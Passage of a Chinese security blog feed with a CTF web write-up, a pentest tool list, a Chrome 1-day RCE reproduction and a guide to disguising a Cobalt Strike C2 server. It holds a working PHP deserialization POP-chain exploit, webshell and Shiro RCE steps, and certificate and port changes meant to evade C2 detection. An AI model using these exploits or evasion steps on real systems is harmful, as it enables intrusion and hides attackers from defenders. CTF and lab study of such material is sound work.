class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_hint</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  <span class="title class_">Start</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析源码后，发现是php反序列化，构造pop链如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="variable language_">$this</span>-&gt;flag.<span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_hint</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$info</span>=<span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$room</span>=<span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$info</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]=<span class="variable">$room</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$info</span>;</span><br><span class="line"><span class="variable">$room</span>-&gt;a=<span class="variable">$room</span>;</span><br><span class="line"><span class="variable">$room</span>-&gt;sth_to_set=<span class="variable">$start</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$room</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223352517-191055087.png"></p><p>base64解码后得到flag（注：前面有个hi，要将其剔除在解码）</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223352297-412938048.png"></p><h2 id="0x03-EasyWeb"><a href="#0x03-EasyWeb" class="headerlink" title="0x03 EasyWeb"></a>0x03 EasyWeb</h2><p>扫端口发现还有36842开放</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223351960-45912832.png"></p><p>登录页面用户名出存在sql注入，sqlmap一把梭，即可获取用户名，密码</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223351592-9736726.png"></p><p>登录进后台，扫目录发现上传路由</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223351315-427136946.png"></p><p>构造上传，蚁剑连接</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223351060-1853401019.png"></p><p>使用ew代理出来后扫描端口 ，发现8006开放着jboss服务</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223350807-319572618.png"></p><p>获取flag</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223350511-358911536.png"></p><h2 id="0x04-Hard-Penetration"><a href="#0x04-Hard-Penetration" class="headerlink" title="0x04 Hard_Penetration"></a>0x04 Hard_Penetration</h2><p>shiro rce，注入内存马后使用冰蝎连接，发现当前用户为ctf，无法读取flag，于是使用ew代理出来扫端口，在8005端口有一个php站点，发现为TP3.1.3开发的CMS，审计源码后发现存在文件包含</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223350246-310821575.png"></p><p>构造shell去包含<br><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223350000-387890256.png"></p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223349709-1924352085.png"></p><p>使用蚁剑连接，获得flag</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223349317-2137214378.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;0x01-强网先锋-寻宝&quot;&gt;&lt;a href=&quot;#0x01-强网先锋-寻宝&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>在线工具大全</title>
    <link href="https://theth1nk3r.github.io/2021/05/04/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E5%A4%A7%E5%85%A8/"/>
    <id>https://theth1nk3r.github.io/2021/05/04/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E5%A4%A7%E5%85%A8/</id>
    <published>2021-05-03T19:40:00.000Z</published>
    <updated>2022-12-14T07:41:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用在线工具"><a href="#常用在线工具" class="headerlink" title="常用在线工具"></a>常用在线工具</h1><p>[toc]</p><h2 id="0x00-在线工具聚合大全"><a href="#0x00-在线工具聚合大全" class="headerlink" title="0x00 在线工具聚合大全"></a>0x00 在线工具聚合大全</h2><p><a href="https://forum.ywhack.com/bountytips.php?tools">棱角在线工具</a></p><p><a href="https://gitbook.se7ensec.cn/">在线肾透中心</a></p><h2 id="0x01-空间搜索引擎"><a href="#0x01-空间搜索引擎" class="headerlink" title="0x01 空间搜索引擎"></a>0x01 空间搜索引擎</h2><p><a href="https://fofa.so/">FOFA.so 网络空间搜索引擎</a></p><p><a href="%5Bhttps://www.zoomeye.org/%5D(https://www.zoomeye.org/?R1nG)">ZoomEye 钟馗之眼</a></p><p><a href="%5Bhttps://quake.360.cn/quake/%5D(https://quake.360.cn/quake/#/index)">360 网络空间资产测绘</a></p><p><a href="https://censys.io/">Censys 联网设备信息搜索引擎</a></p><p><a href="https://dnsdb.io/">DNSDB - 全球DNS搜索引擎</a></p><h2 id="0x02-常用信息收集"><a href="#0x02-常用信息收集" class="headerlink" title="0x02 常用信息收集"></a>0x02 常用信息收集</h2><p><a href="http://ip.tool.chinaz.com/">站长工具</a><br><a href="https://tools.ipip.net/ipdomain.php">ip反查域名</a><br><a href="https://tools.yum6.cn/Tools/urlblast/">在线子域名查询</a><br><a href="http://www.t1h2ua.cn/tools/">在线子域名查询（乌云字典）</a><br><a href="http://bugku.com/mima/">bugku密码生成器</a></p><h2 id="0x03-破解-x2F-MD5加解密类"><a href="#0x03-破解-x2F-MD5加解密类" class="headerlink" title="0x03 破解&#x2F;MD5加解密类"></a>0x03 破解&#x2F;MD5加解密类</h2><p><a href="https://www.cmd5.com/">cmd5</a></p><p><a href="https://www.somd5.com/">somd5</a></p><p><a href="https://www.hacked.com.cn/pass.html">Hacked.com.cn猜密码平台</a></p><h2 id="0x04-社工查询"><a href="#0x04-社工查询" class="headerlink" title="0x04 社工查询"></a>0x04 社工查询</h2><p><a href="https://www.tianyancha.com/">天眼查</a></p><p><a href="https://www.reg007.com/">注册信息查询reg007</a></p><p><a href="http://www.regbao.com/?from=email">注册信息查询注册宝</a></p><p><a href="https://aiqicha.baidu.com/">爱企查</a></p><p><a href="https://www.qcc.com/">企查查</a></p><h2 id="0x05-在线沙箱"><a href="#0x05-在线沙箱" class="headerlink" title="0x05 在线沙箱"></a>0x05 在线沙箱</h2><p><a href="https://www.virustotal.com/gui/">visualTotal在线病毒查杀</a></p><p><a href="https://habo.qq.com/">腾讯哈勃分析系统</a></p><p><a href="https://www.virscan.org/">virscan在线查杀</a></p><h2 id="0x06-webshell查杀"><a href="#0x06-webshell查杀" class="headerlink" title="0x06 webshell查杀"></a>0x06 webshell查杀</h2><p><a href="https://scanner.baidu.com/#/pages/intro">openRASP在线查杀</a></p><p><a href="https://n.shellpub.com/">河马webshell在线查杀</a></p><h2 id="0x07-在线编码"><a href="#0x07-在线编码" class="headerlink" title="0x07 在线编码"></a>0x07 在线编码</h2><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java payload 编码</a><br><a href="https://tool.chinaz.com/tools/base64.aspx">base64 站长工具</a></p><h2 id="0x08-在线信息收集"><a href="#0x08-在线信息收集" class="headerlink" title="0x08 在线信息收集"></a>0x08 在线信息收集</h2><p><a href="https://phpinfo.me/domain/">在线子域名查询</a><br><a href="https://scan.dyboy.cn/web/">在线指纹查询</a><br><a href="https://pentest.gdpcisa.org/whatcms">whatcms</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常用在线工具&quot;&gt;&lt;a href=&quot;#常用在线工具&quot; class=&quot;headerlink&quot; title=&quot;常用在线工具&quot;&gt;&lt;/a&gt;常用在线工具&lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;0x00-在线工具聚合大全&quot;&gt;&lt;a href=&quot;#0x00-在线工具聚合</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Chrome RCE 1day漏洞复现</title>
    <link href="https://theth1nk3r.github.io/2021/04/13/Chrome-RCE-1day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://theth1nk3r.github.io/2021/04/13/Chrome-RCE-1day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-13T01:41:00.000Z</published>
    <updated>2022-12-18T12:28:28.225Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00  漏洞描述"></a>0x00  漏洞描述</h2><p>Google Chrome是由Google开发的免费网页浏览器，大量采用Chrome内核的浏览器同样也会受此漏洞影响。攻击者利用此漏洞，可以构造一个恶意的web页面，当用户访问该页面时，会造成远程代码执行。</p><p><strong>由于Chrome浏览器会默认开启沙盒，可以拦截利用该漏洞发起的攻击，所以一般用户不会受到影响。</strong></p><h2 id="0x01-影响-版本"><a href="#0x01-影响-版本" class="headerlink" title="0x01 影响 版本"></a>0x01 影响 版本</h2><p>Google Chrome &lt;&#x3D; 89.0.4389.114</p><p>使用Chrome内核的其它浏览器，也会受到此漏洞影响。</p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>原作者Twitter地址：<a href="https://twitter.com/r4j0x00/status/1381643526010597380">https://twitter.com/r4j0x00/status/1381643526010597380</a></p><p>poc地址：<a href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day">https://github.com/r4j0x00/exploits/tree/master/chrome-0day</a></p><p>因Chrome默认会开启沙盒，所以需要将沙盒关闭测试，我在这里就直接使用命令行来启动，–no-sandbox参数就是不使用沙盒开启</p><p><img src="/2021/04/13/Chrome-RCE-1day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2246609-20210413174010648-28783962.png"></p><p><img src="/2021/04/13/Chrome-RCE-1day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2246609-20210413174010347-990783463.png"></p><p>然后使用Chrome打开exploit.html，然后浏览器会调用exploit.js</p><p><img src="/2021/04/13/Chrome-RCE-1day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2246609-20210413174009711-1389723164.png"></p><p>打开exploit.html后，浏览器会调用本地的计算器程序</p><p><img src="/2021/04/13/Chrome-RCE-1day%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2246609-20210413174009250-1340113500.png"></p><h2 id="0x03修复建议"><a href="#0x03修复建议" class="headerlink" title="0x03修复建议"></a>0x03修复建议</h2><p>目前Google只针对该漏洞发布了beta测试版Chrome（90.0.4430.70）修复，Chrome正式版（89.0.4389.114）仍存在漏洞，请关注官方Chrome正式版更新，及时修补漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-漏洞描述&quot;&gt;&lt;a href=&quot;#0x00-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x00  漏洞描述&quot;&gt;&lt;/a&gt;0x00  漏洞描述&lt;/h2&gt;&lt;p&gt;Google Chrome是由Google开发的免费网页浏览器，大量采用Chro</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="https://theth1nk3r.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>如何隐藏C2</title>
    <link href="https://theth1nk3r.github.io/2021/03/14/%E5%A6%82%E4%BD%95%E9%9A%90%E8%97%8FC2/"/>
    <id>https://theth1nk3r.github.io/2021/03/14/%E5%A6%82%E4%BD%95%E9%9A%90%E8%97%8FC2/</id>
    <published>2021-03-13T23:23:00.000Z</published>
    <updated>2022-12-18T12:23:07.731Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-去除特征"><a href="#0x01-去除特征" class="headerlink" title="0x01 去除特征"></a>0x01 去除特征</h2><h3 id="1-更改默认端口"><a href="#1-更改默认端口" class="headerlink" title="1. 更改默认端口"></a>1. 更改默认端口</h3><p>方法一： 直接编辑teamserver进行启动项修改<br>方法二：在启动的时候指定server_port</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -XX:ParallelGCThreads=4 -Duser.language=en -Dcobaltstrike.server_port=50505 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -Xmx1024m -classpath ./cobaltstrike.jar server.TeamServer xxx.xxx.xx.xx test google.profile</span><br></pre></td></tr></table></figure><h3 id="2-去除证书特征"><a href="#2-去除证书特征" class="headerlink" title="2. 去除证书特征"></a>2. 去除证书特征</h3><blockquote><p>Keytool是一个java数据证书的管理工具，Keytool将密钥 和 证书 存放在一个称为 keystore 的文件中,即.store后缀的文件中。</p></blockquote><h4 id="keytool命令"><a href="#keytool命令" class="headerlink" title="keytool命令"></a>keytool命令</h4><p>非法选项:  -h<br>密钥和证书管理工具</p><table><thead><tr><th>命令</th><th></th></tr></thead><tbody><tr><td>-certreq</td><td>生成证书请求</td></tr><tr><td>-changealias</td><td>更改条目的别名</td></tr><tr><td>-delete</td><td>删除条目</td></tr><tr><td>-exportcert</td><td>导出证书</td></tr><tr><td>-genkeypair</td><td>生成密钥对</td></tr><tr><td>-genseckey</td><td>生成密钥</td></tr><tr><td>-gencert</td><td>根据证书请求生成证书</td></tr><tr><td>-importcert</td><td>导入证书或证书链</td></tr><tr><td>-importpass</td><td>导入口令</td></tr><tr><td>-importkeystore</td><td>从其他密钥库导入一个或所有条目</td></tr><tr><td>-keypasswd</td><td>更改条目的密钥口令</td></tr><tr><td>-list</td><td>列出密钥库中的条目</td></tr><tr><td>-printcert</td><td>打印证书内容</td></tr><tr><td>-printcertreq</td><td>打印证书请求的内容</td></tr><tr><td>-printcrl</td><td>打印 CRL 文件的内容</td></tr><tr><td>-storepasswd</td><td>更改密钥库的存储口令</td></tr></tbody></table><p>使用 “keytool -command_name -help” 获取 command_name 的用法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看证书文件：keytool -list -v -keystore xx.store</span><br><span class="line">修改证书密码：keytool -storepasswd -keystore test.store</span><br><span class="line">修改keystore的<span class="built_in">alias</span>别名：keytool -changealias -keystore test.store -<span class="built_in">alias</span> source_name -destalias new_name</span><br><span class="line">修改<span class="built_in">alias</span>（别名）的密码：keytool -keypasswd -keystore test.store -<span class="built_in">alias</span> source_name</span><br></pre></td></tr></table></figure><h4 id="keystore"><a href="#keystore" class="headerlink" title="keystore"></a>keystore</h4><p>Keystore是什么？keystore是java的密钥库，用来进行通信加密，如数字签名。keystore就是用来保存密钥对的，公钥和私钥。Keystore可理解为一个数据库，可以存放很多个组数据。<br>每组数据主要包含以下两种数据:</p><ul><li>密钥实体 — 密钥(secret key)又或者私钥和配对公钥(采用非对称加密)</li><li>可信任的证书实体 — 只包含公钥</li></ul><p>查看CobaltStrike的默认store文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure><p><img src="/2021/03/14/%E5%A6%82%E4%BD%95%E9%9A%90%E8%97%8FC2/2246609-20210313210110189-1383677159.png" alt="0fcee4e35fd7f4a0d4158b51e3a05552.png"></p><p>输入默认密码123456回车，可以看见cobaltstrike默认的store文件中的Alias name、Onwer和Issuer的信息，特征比较明显</p><h4 id="创建新的CobaltStrike-store"><a href="#创建新的CobaltStrike-store" class="headerlink" title="创建新的CobaltStrike.store"></a>创建新的CobaltStrike.store</h4><p>为了掩盖默认ssl证书存在的特征，需重新创建一个不一样的证书</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 -genkey -keyalg RSA -<span class="built_in">alias</span> google.com -dname <span class="string">&quot;CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)&quot;</span></span><br></pre></td></tr></table></figure><ul><li>-alias 指定别名</li><li>-storepass pass 和 -keypass pass 指定密钥</li><li>-keyalg 指定算法</li><li>-dname 指定所有者信息</li></ul><p>删除 CobaltStrike 